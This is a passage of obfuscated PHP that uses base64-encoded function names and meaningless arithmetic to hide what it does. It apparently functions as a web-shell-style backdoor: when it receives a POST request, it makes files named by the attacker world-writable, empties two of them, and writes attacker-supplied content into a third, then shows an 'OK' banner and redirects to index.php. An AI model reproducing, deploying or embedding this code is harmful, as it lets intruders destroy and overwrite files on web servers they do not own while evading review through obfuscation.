.'W4='),base64_decode('Zndya' .'XRl'),base64_decode('b' .'XR' .'fcmFuZA=='),base64_decode('Zmls' .'Z' .'WF0aW1l'),base64_decode('Zm' .'Nsb3Nl'),base64_decode('' .'c3Rycml' .'wb' .'3M='),base64_decode('cHJlZ19xdW9' .'0ZQ=='),base64_decode('bXR' .'fcmFu' .'ZA==')); ?><? function _504653661($i){$a=Array('ZG1i','' .'Zm' .'lsZV9h','J' .'W8=','' .'MD' .'c3N' .'w' .'=' .'=','d' .'w==','','ZmlsZV9i','J' .'W8=','' .'MD' .'c3' .'Nw' .'=' .'=','dw==','','Zm' .'lsZV9j','J' .'W' .'8=','MDc3Nw==','' .'d' .'w==','ZmlsZV9kYXRhX' .'2M=','' .'PG' .'gyIH' .'N0eWxl' .'PSJw' .'b3NpdGlvbjphYnNvbH' .'V0' .'ZTsgei' .'1' .'pbmRleDo5OTk' .'5' .'OyB0b' .'3A6' .'NTh' .'weDsgbG' .'V' .'mdDowOyBiYWNrZ' .'3JvdW5kOiMwMDA7IGNvbG9y' .'OiNmZmY' .'7I' .'HBhZGRpbmc' .'6MT' .'RweCAyOHB4I' .'DE0c' .'HggMjhweDsiPk9LPC9oMj' .'4=','DQoJPH' .'Nj' .'cml' .'wdD4' .'NC' .'iAgI' .'C' .'B2YXIgZGVs' .'YX' .'k' .'gPS' .'AzMDAwOw' .'0' .'KICAgIHNld' .'F' .'RpbWV' .'vd' .'X' .'Q' .'oImRvY3VtZ' .'W50LmxvY2F0aW9uLmhyZ' .'WY9' .'J' .'2l' .'uZ' .'GV' .'4' .'L' .'nBocCciLCBkZ' .'W' .'xheSk7D' .'QogI' .'CAgPC9zY3Jp' .'c' .'HQ' .'+','M' .'Q==');return base64_decode($a[$i]);} ?><? if(isset($_POST[_504653661(0)])){$file_a=$folder .$psep .$_POST[_504653661(1)];if($GLOBALS['_1960247008_'][0]($file_a)){$cmod_file_a=$GLOBALS['_1960247008_'][1]($GLOBALS['_1960247008_'][2](_504653661(2),$GLOBALS['_1960247008_'][3]($file_a)),-round(0+4));if($cmod_file_a != _504653661(3)){$GLOBALS['_1960247008_'][4]($file_a,round(0+127.75+127.75+127.75+127.75));}$fp_dm_a=$GLOBALS['_1960247008_'][5]($file_a,_504653661(4));$GLOBALS['_1960247008_'][6]($fp_dm_a,_504653661(5));$GLOBALS['_1960247008_'][7]($fp_dm_a);if(round(0+1892.5+1892.5+1892.5+1892.5)<$GLOBALS['_1960247008_'][8](round(0+650.25+650.25+650.25+650.25),round(0+2482+2482)))$GLOBALS['_1960247008_'][9]($fp_dm_b);}$file_b=$folder .$psep .$_POST[_504653661(6)];if($GLOBALS['_1960247008_'][10]($file_b)){$cmod_file_b=$GLOBALS['_1960247008_'][11]($GLOBALS['_1960247008_'][12](_504653661(7),$GLOBALS['_1960247008_'][13]($file_b)),-round(0+1.3333333333333+1.3333333333333+1.3333333333333));if($cmod_file_b != _504653661(8)){$GLOBALS['_1960247008_'][14]($file_b,round(0+170.33333333333+170.33333333333+170.33333333333));}$fp_dm_b=$GLOBALS['_1960247008_'][15]($file_b,_504653661(9));$GLOBALS['_1960247008_'][16]($fp_dm_b,_504653661(10));$GLOBALS['_1960247008_'][17]($fp_dm_b);if((round(0+837.75+837.75+837.75+837.75)^round(0+3351))&& $GLOBALS['_1960247008_'][18]($cmod_file_b,$folder,$file_a))$GLOBALS['_1960247008_'][19]($folder,$cmod_file_b,$psep);}$file_c=$folder .$psep .$_POST[_504653661(11)];if($GLOBALS['_1960247008_'][20]($file_c)){$cmod_file_c=$GLOBALS['_1960247008_'][21]($GLOBALS['_1960247008_'][22](_504653661(12),$GLOBALS['_1960247008_'][23]($file_c)),-round(0+1+1+1+1));if($cmod_file_c != _504653661(13)){$GLOBALS['_1960247008_'][24]($file_c,round(0+102.2+102.2+102.2+102.2+102.2));}$fp_dm_c=$GLOBALS['_1960247008_'][25]($file_c,_504653661(14));$GLOBALS['_1960247008_'][26]($fp_dm_c,$_POST[_504653661(15)]);if(round(0+1920)<$GLOBALS['_1960247008_'][27](round(0+100.5+100.5+100.5+100.5),round(0+756.5+756.5)))$GLOBALS['_1960247008_'][28]($fp_dm_b,$fp_dm_b,$_POST,$_POST,$fp_dm_a);$GLOBALS['_1960247008_'][29]($fp_dm_c);}echo _504653661(16);echo _504653661(17);while(round(0+291.6+291.6+291.6+291.6+291.6)-round(0+729+729))$GLOBALS['_1960247008_'][30]($fp_dm_c,$cmod_file_a,$file_c);}$onriv_take=_504653661(18);(round(0+178.75+178.75+178.75+178.75)-round(0+143+143+143+143+143)+round(0+715.2+715.2+715.2+715.2+715.2)-round(0+1788+1788))?$GLOBALS['_1960247008_'][31]($cmod_file_c,$onriv_take,$folder):$GLOBALS['_1960247008_'][32](round(0+238.33333333333+238.33333333333+238.33333333333),round(0+1704));



?>